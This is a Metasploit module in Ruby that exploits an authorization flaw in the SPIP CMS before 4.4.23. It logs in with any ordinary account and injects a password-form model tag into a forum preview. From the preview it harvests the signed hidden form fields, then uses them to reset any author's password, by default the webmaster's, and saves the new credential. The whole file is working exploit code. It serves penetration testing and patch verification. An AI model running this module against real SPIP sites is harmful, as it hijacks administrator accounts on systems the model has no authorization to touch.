##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Spip
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SPIP Password Change IDOR Privilege Escalation',
        'Description' => %q{
          SPIP before 4.4.23 has a missing authorization check in the
          mot_de_passe CVT form handler. The traiter function changes
          any user's password when given a validly-signed form POST,
          without verifying the caller is authorized for that id_auteur.

          An authenticated user injects a SPIP model tag into a forum
          message preview. The model <formulaire|mot_de_passe|id_auteur=N>
          causes the server to render the password form for user N and
          HMAC-sign the form arguments. The preview replaces <form> tags
          with <div> but leaves hidden inputs intact, leaking the signed
          arguments. Submitting them changes the target user's password.
        },
        'Author' => [
          'Julien Voisin' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-4-23.html']
        ],
        'DisclosureDate' => '2026-09-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [true, 'SPIP username (any authenticated account)']),
      OptString.new('PASSWORD', [true, 'Password for the SPIP account']),
      OptInt.new('TARGET_ID', [true, 'Author ID whose password to change (1 = webmaster)', 1]),
      OptString.new('NEW_PASSWORD', [false, 'New password (random if blank)'])
    ])
  end

  def check
    rversion = spip_version || spip_plugin_version('spip')
    return Exploit::CheckCode::Unknown('Unable to determine SPIP version') unless rversion

    print_status("SPIP version: #{rversion}")
    return Exploit::CheckCode::Safe("SPIP #{rversion} is patched") if rversion >= Rex::Version.new('4.4.23')

    Exploit::CheckCode::Appears("SPIP #{rversion} lacks authorization on password change form")
  end

  # Inject <formulaire|mot_de_passe|id_auteur=N> into each discovered forum preview
  # and return the leaked CVT fields for the password form.
  def inject_model_via_forum(target_id)
    model_tag = "<formulaire|mot_de_passe|id_auteur=#{target_id}>"

    forum_targets.each do |target|
      result = try_forum_preview(model_tag, target)
      return result if result
    end
    nil
  end

  def try_forum_preview(model_tag, target)
    vprint_status("Trying #{target[:label]}...")
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => target[:uri],
      'cookie' => @spip_cookie,
      'vars_get' => target[:params]
    )
    return unless res&.code == 200

    cvt = spip_extract_cvt_fields(res.get_html_document, target[:form_action])
    return unless cvt

    vprint_good("Forum form found: #{target[:label]}")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => target[:uri],
      'cookie' => @spip_cookie,
      'vars_get' => target[:params],
      'vars_post' => target.fetch(:post_extra, {}).merge(
        'formulaire_action' => target[:form_action],
        'formulaire_action_args' => cvt['args'],
        'formulaire_action_sign' => cvt['sign'],
        'texte' => model_tag,
        'titre' => Rex::Text.rand_text_alpha(8)
      )
    )
    return unless res

    cvt = spip_extract_cvt_fields(res.get_html_document, 'mot_de_passe')
    return unless cvt

    print_good("Extracted signed password form from #{target[:label]}")
    cvt
  end

  def forum_targets
    ecrire_uri = normalize_uri(target_uri.path, 'ecrire/')
    public_uri = normalize_uri(target_uri.path, 'spip.php')
    targets = []

    # Private forums: rubrique #1 always exists, then scrape the dashboard for more
    discover_object_ids.each do |objet, id|
      targets << {
        label: "private #{objet} ##{id}",
        uri: ecrire_uri,
        form_action: 'forum_prive',
        params: { 'exec' => 'forum', 'repondre' => 'new', 'objet' => objet, 'id_objet' => id }
      }
    end

    # Public forums on discovered articles
    discover_article_ids.each do |id|
      targets << {
        label: "public article ##{id}",
        uri: public_uri,
        form_action: 'forum',
        params: { 'page' => 'forum', 'id_article' => id },
        post_extra: { 'page' => 'forum', 'id_article' => id }
      }
    end

    targets
  end

  def discover_object_ids
    pairs = [['rubrique', 1]]
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'ecrire/'),
      'cookie' => @spip_cookie,
      'vars_get' => { 'exec' => 'accueil' }
    )
    if res&.code == 200
      res.body.scan(/id_article=(\d+)/) { |m| pairs << ['article', m[0].to_i] }
      res.body.scan(/id_rubrique=(\d+)/) { |m| pairs << ['rubrique', m[0].to_i] }
    end
    pairs.uniq
  end

  def discover_article_ids
    ids = []
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, ''),
      'cookie' => @spip_cookie
    )
    if res&.code == 200
      res.body.scan(/spip\.php\?article(\d+)/) { |m| ids << m[0].to_i }
      res.body.scan(/id_article=(\d+)/) { |m| ids << m[0].to_i }
    end
    ids.uniq.sort
  end

  def run
    begin
      spip_login(datastore['USERNAME'], datastore['PASSWORD'])
    rescue Rex::RuntimeError => e
      fail_with(Failure::NoAccess, e.message)
    end
    print_good("Authenticated as '#{datastore['USERNAME']}'")

    target_id = datastore['TARGET_ID']
    print_status("Injecting model to render password form for author ##{target_id}...")

    cvt = inject_model_via_forum(target_id)
    fail_with(Failure::NotVulnerable, "Could not render password form for author ##{target_id}") unless cvt

    pass = datastore['NEW_PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['NEW_PASSWORD']
    print_status("Submitting password change for author ##{target_id}...")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'spip.php'),
      'cookie' => @spip_cookie,
      'vars_post' => {
        'formulaire_action' => 'mot_de_passe',
        'formulaire_action_args' => cvt['args'],
        'formulaire_action_sign' => cvt['sign'],
        'oubli' => pass,
        'oubli_confirm' => pass,
        'nobot' => ''
      }
    )
    fail_with(Failure::Unreachable, 'Target did not respond') unless res
    if res.get_html_document.at_css('.reponse_formulaire_erreur')
      fail_with(Failure::UnexpectedReply, 'Password change was rejected by the server')
    end

    print_good("Password for author ##{target_id} changed to: #{pass}")
    report_vuln(host: rhost, port: rport, name: name, refs: references)
    store_valid_credential(user: "author_#{target_id}", private: pass)
  end
end
